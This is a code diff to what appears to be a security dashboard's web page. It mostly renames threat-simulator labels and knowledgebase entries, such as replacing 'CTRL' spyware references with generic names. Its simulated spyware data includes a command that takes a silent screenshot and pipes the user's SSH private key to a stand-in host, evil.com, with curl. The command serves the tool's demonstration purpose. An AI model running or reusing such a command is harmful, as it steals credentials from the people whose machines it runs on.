@@ -809,7 +809,7 @@
       <button class="nav-btn" id="tabBtn-scanner" onclick="switchTab('scanner')">🔍 Log & Screenshot Scanner</button>
       <button class="nav-btn" id="tabBtn-simulator" onclick="switchTab('simulator')">⚡ Threat Simulator</button>
       <button class="nav-btn" id="tabBtn-threatdb" onclick="switchTab('threatdb')">📚 Knowledgebase</button>
-      <a href="/#launch-video" class="nav-btn" style="text-decoration:none; color: var(--accent);">🎬 Launch Video</a>
+      <a href="/#launch-video" class="nav-btn" style="text-decoration:none; color: var(--accent);">🎬 Product Tour</a>
       <a href="/" class="nav-btn" style="text-decoration:none;">🏠 Launch Site</a>
     </nav>
 
@@ -978,7 +978,7 @@
             <span>Rapid subnet sweep on port 445 & lateral move</span>
           </button>
           <button class="btn-sim yellow" onclick="triggerSim('spyware')">
-            👁️ "CTRL" Movie Spyware
+            👁️ Covert Spyware & Screen Snooping
             <span>Background screen capture & SSH credential scraping</span>
           </button>
           <button class="btn-sim" style="border-color: var(--accent);" onclick="togglePrivacyCallSimulation()">
@@ -1018,13 +1018,13 @@
         </div>
 
         <div class="threat-card" style="border-color: rgba(245, 158, 11, 0.4);">
-          <div class="threat-card-title" style="color: var(--yellow);">👁️ Spyware / Surveillance ("CTRL")</div>
+          <div class="threat-card-title" style="color: var(--yellow);">👁️ Spyware / Surveillance</div>
           <p>Passively captures user input, keystrokes, webcam feeds, screen recordings, and extracts browser credentials.</p>
-          <p><strong>Known Families:</strong> Pegasus, RedLine Stealer, AgentTesla, CTRL-Trojan</p>
+          <p><strong>Known Families:</strong> Pegasus, RedLine Stealer, AgentTesla, DarkWatch</p>
           <p><strong>Mode:</strong> PASSIVE THREAT</p>
         </div>
 
-        <div class="threat-card" style="border-color: rgba(56, 189, 248, 0.4);">
+        <div class="threat-card" style="border-color: rgba(16, 185, 129, 0.4);">
           <div class="threat-card-title" style="color: var(--accent);">🛡️ Anti-Screen Sharing Shield</div>
           <p>Renders window completely black during active calls (Zoom, Meet, FaceTime, Teams, UPI apps) to prevent visual exfiltration.</p>
           <p><strong>Protocol:</strong> DRM NSWindowSharingNone / MediaStream Guard</p>
@@ -1391,7 +1391,7 @@
         },
         threat_classification: {
           identified: true,
-          threat_name: "CTRL Surveillance Spyware",
+          threat_name: "Covert Surveillance Spyware",
           candidate_family: "Stealth Headless Screen Surveillance",
           operational_mode: "PASSIVE",
           risk_score: 84,
@@ -1543,7 +1543,7 @@
           advisory: "HIGH RISK: Outbound port scans and unauthorized remote file copies to network subnets. Port 445 blocked."
         },
         spyware: {
-          name: "CTRL Surveillance Spyware",
+          name: "Covert Surveillance Spyware",
           family: "Stealth Headless Screen Surveillance",
           cmd: "screencapture -x -C /tmp/.hidden_stream.png && cat ~/.ssh/id_rsa | curl -d @- evil.com/drop",
           parent: "updater_daemon",
